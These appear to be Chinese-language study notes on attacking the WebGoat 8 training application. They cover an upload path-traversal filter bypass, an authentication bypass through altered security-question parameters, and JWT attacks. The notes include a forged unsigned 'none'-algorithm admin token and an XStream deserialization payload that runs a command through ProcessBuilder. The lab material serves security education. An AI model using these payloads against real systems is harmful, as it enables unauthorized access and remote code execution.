![1645090022103-7a690873-96a8-47c2-8c06-6b03ffbb0699.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912111541171-1744394242.png)

```plain
#知识点：
1、JavaWeb常见安全及代码逻辑
通过URL信息来对应源码文件。没有代码的情况下很难渗透。
2、目录遍历&身份验证&逻辑&JWT
3、访问控制&安全组件&越权&三方组件
```

- #### JavaWeb-WebGoat8靶场搭建使用

```plain
• https://blog.csdn.net/Petrichoryi/article/details/105930751
• 压缩到jar包里面。
• 如何启动：安装jdk，运行java.exe -jar webgoat --server.port= 9091
• 
• java -jar webgoat-server-8.1.0.jar --server.port=8091
访问ip+WebGoat/login.html，注册账号登录就可以了。
```

![1645090432523-f55a8ddf-e86b-4f6b-aa7c-2bfd0bebcdac.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912111556474-1572944158.png)

- #### 安全问题-目录遍历&身份认证-JWT攻击

```plain
目录遍历：
解决问题：当前目录不能执行，上传至别的目录进行执行脚本
上传上去的地址：
```

![1645090478337-3004bca5-cced-41ac-9f0b-dc57e7d1ccd9.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912111609050-1342606588.png)

```plain
目标地址：
```

![1645090514532-60d46d4a-cff1-472c-b24b-ab9d1b92b549.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912111616236-1728339114.png)

```plain
抓取上传数据包：
```

![1645090540768-f0d24f42-0a24-4e73-8362-eefb31931729.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912111630201-1171174763.png)

```plain
找到相对应触发的代码段：
```

![1645090563673-4e6b630e-2dbb-4191-b322-211e1d2efbe6.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912111644817-1717167368.png)

```plain
关键代码：
publicAttackResultuploadFileHandler(@RequestParam("uploadedFile")MultipartFilefile,@RequestParam(value="fullName",required=false)StringfullName){
returnsuper.execute(file,fullName);
}

接受uploadedfile
对应抓包：
```

![1645090590593-e952b99e-04b9-4c72-8bbd-f83e4f6eb53a.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912111655166-2135752443.png)

```plain
把test修改为1后，发现返回数据包：
```

![1645090613708-9d6820b6-ec16-4c80-8340-2362e125610a.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912111903769-1808292281.png)

```plain
把fullname修改为：
```

![1645090640654-ceb5e2d4-dd6a-4737-af25-14d31078a384.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912111913618-128187184.png)

```plain
成功过关。
第三关，用同样的方式没有用了，打开相对应的代码，发现关键的过滤：
```

![1645090671142-2661347f-c4c2-4820-a2f4-0ea4414b9013.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912111921258-1988537304.png)

```plain
但是这个过滤知识一次性的，并不是很严格。
双写绕过：
```

![1645090695663-6cd93f1d-55ae-4601-89a6-e8ee4ea53597.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912111931173-1696608880.png)

```plain
解决问题：当前上传的文件所在的文件夹不解析。
```

```plain
身份认证：
认证问题答案，很多选项：
你叫什么名字等等.....只有两个问题

接受键名和键值
s0=xiaodi&s1=湖北 正确
s3=null&s4=null发送数据
s3 s4为空，相当于NULL，那么就能进行绕过。
安全验证：
固定接受的数据：s0 s1判断你的数据 正常
不固定：s0 s1 正常
不固定：s2 s3不在数据库或者变量内，攻击者就能测试。
URL触发连接，访问地址：auth-bypass/verify-account
```

![1645090757002-b1485312-0b9a-472f-8074-24fd99a2a170.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912111958077-54468339.png)

```plain
找到对应的代码段
```

![1645090781845-a40b7ac8-ce83-4674-92ee-2c6b7d4099b6.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912112012284-2050173019.png)

```plain
JWT：
https://www.cnblogs.com/vege/p/14468030.html
三部分构成，以.分隔，出现在cookie上。
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
对比cookie
解密平台：https://jwt.io/

eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
```

![1645090823771-e440ff15-aa42-488b-a1b0-be6b9c9be9a0.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912112023321-403213359.png)

```plain
切换账号，抓包发现：
```

![1645090849303-a64b5ee3-4172-41e5-9536-957e2744869c.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912112035790-1781663205.png)

```plain
cookie：eyJhbGciOiJIUzUxMiJ9.eyJpYXQiOjE2NDMxOTk5MzYsImFkbWluIjoiZmFsc2UiLCJ1c2VyIjoiVG9tIn0.C_2nlYK5_bhv5RHnRbPW7sxIkZsaPN-AYX3xBwo3n5PeIzdK7G1-sjJjo8qIaH_JHZVaR7amGQTdNiEjYAkAMg

解密后：
```

![1645090882379-37aa8e05-4fc6-4fc3-b70e-2e2e7c56b1aa.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912112044811-173805144.png)

```plain
攻击：1.空加密算法 2.爆破 3.KID
1.空加密算法：
生成字符串：算法模式+秘钥（缺一不可）
忽略秘钥生成，需要服务器支持不要秘钥签名（空模式加密）
抓到数据包
```

![1645090919289-7bbcad21-14bc-44b6-8ce5-56f90bd259a6.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912112055515-661741469.png)

```plain
找到相对应的代码段发现可以空加密然后用python脚本去写空加密jwt
eyJhbGciOiJub25lIn0.eyJpYXQiOjE1NzM0NzAwMjUsImFkbWluIjoidHJ1ZSIsInVzZXIiOiJKZXJyeSJ9.


2.爆破：
```

- #### 安全问题-访问控制&安全组件-第三方组件

```plain
-联想到刚爆出的Log4j2
<sorted-set>
 <string>foo</string>
 <dynamic-proxy>
 <interface>java.lang.Comparable</interface>
 <handler class="java.beans.EventHandler">
 <target class="java.lang.ProcessBuilder">
 <command>
 <string>calc.exe</string>
 </command>
 </target>
 <action>start</action>
 </handler>
 </dynamic-proxy>
</sorted-set>
```

![1645090991052-86a27d1e-9568-4323-bed6-e11e56752f56.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912112112921-1896572997.png)